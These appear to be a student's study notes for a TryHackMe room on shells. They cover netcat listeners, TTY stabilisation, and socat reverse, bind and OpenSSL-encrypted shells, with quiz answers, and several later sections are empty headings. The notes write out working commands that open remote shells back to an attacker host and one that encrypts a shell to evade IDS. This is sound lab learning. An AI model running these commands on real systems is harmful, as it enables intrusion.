1.What is a shell?

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open 
up a port on the server which we can connect to in order to execute further commands (a bind shell).

2.Tools


https://github.com/swisskyrepo/PayloadsAllTheThings
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://github.com/danielmiessler/SecLists

3.Types of Shell

Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would 
use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse 
shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however,
the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to 
accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the 
network.

Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. 
This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code
execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by 
firewalls protecting the target.

Answer:R,N,T

4.Netcat

    -l is used to tell netcat that this will be a listener
    -v is used to request a verbose output
    -n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
    -p indicates that the port specification will follow.

sudo nc -lvnp 443

The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a 
service using it. 
Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often
a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound 
firewall rules on the target.

Answer:-l,nc 10.10.10.11 8080

5.Netcat Shell Stabilisation

Example of python method:

sudo nc -lvnp 443
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
whoami

The command with python has to be checked if it is python,python2,python3

Answer:stty cols 238,sudo python3 -m http.server 80

6.Socat 

probably gonna try to implement socat more into my basic knowledge since it allows interactive commands and has a more stable shell

Reverse Shell:

The basic command for the listener,try to use the more stable one later on:
socat TCP-L:<port> 

Linux i guess we go on the bash command 
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

Windows command, makes sense since we wanna powershell 
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

Bind Shell:

Linux
socat TCP-L:<PORT> EXEC:"bash -li"

Windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
socat TCP:<TARGET-IP>:<TARGET-PORT> -

Little remainder for Bind/Reverse Shell:
In a reverse shell, the remote machine initiates the connection and sends a request to connect to the target machine. 
In a bind shell, the target machine listens for incoming connections and provides a shell interface when a connection is 
established.

Why reverse shells are used more for bypassing.
With a reverse shell, attackers can often bypass security controls, like firewalls. While firewalls may prevent bind shell 
attacks because they filter incoming traffic, they often provide fewer limits for outgoing connections, meaning they won't 
capture the malicious activity.

The more stable listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0 

Explanation for tty,who command 
https://www.howtogeek.com/428174/what-is-a-tty-on-linux-and-how-to-use-the-tty-command/

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific 
socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, 
however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

When u need to get the precompiled socat binary
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

The command to connect back to the listener
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

Answer:TCP-L:8080

7.Socat Encrypted Shells

Created to often bypass IDS (Intrusion Detection Systems) 

Creating a cert on our attacking machine, then we can use it for the encrypted shell.
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

Merge our 2 files into a single .pem file
cat shell.key shell.crt > shell.pem

Now we setup our listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly 
signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

Connecting 
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

For bind shell:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

Used hint to get to know its FILE:"tty",raw,echo=0
Answer:socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

Okay had to google the second answer link is below
https://medium.com/@zycc2727/tryhackme-what-the-shell-61b54eda78e6
Answer:socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane

I have to look again over this topic since i dont understand 100% whats happening here.

8.Common Shell Payloads



9.msfvenom



10.Metasploit multi/handler



11.WebShells



12.Next Steps



13.Practice and Examples



14.Linux Practice Box



15.Windows Practice Box



